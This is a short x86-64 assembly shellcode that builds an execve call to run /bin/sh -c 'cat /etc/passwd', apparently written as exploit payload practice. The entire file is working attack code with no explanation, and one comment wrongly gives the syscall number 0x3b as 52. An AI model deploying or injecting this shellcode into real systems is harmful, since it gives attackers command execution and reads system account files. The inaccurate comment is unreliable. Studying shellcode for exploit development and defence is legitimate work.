global _start

section .text

_start:

                push 0x3b                       ; push 52 execve syscall
                pop rax
                cdq
                mov rbx, 0x68732f6e69622f       ; mov /bin/sh to rbx

                push rbx
                mov rdi, rsp
                push 0x632d                     ; -c
                mov rsi, rsp
                push rdx

                call poppy
                db 'cat /etc/passwd \n'

poppy:
                push rsi
                push rdi
                mov rsi, rsp                    ; command construct - /bin/sh -c "cat /etc/passwd \n"
                syscall
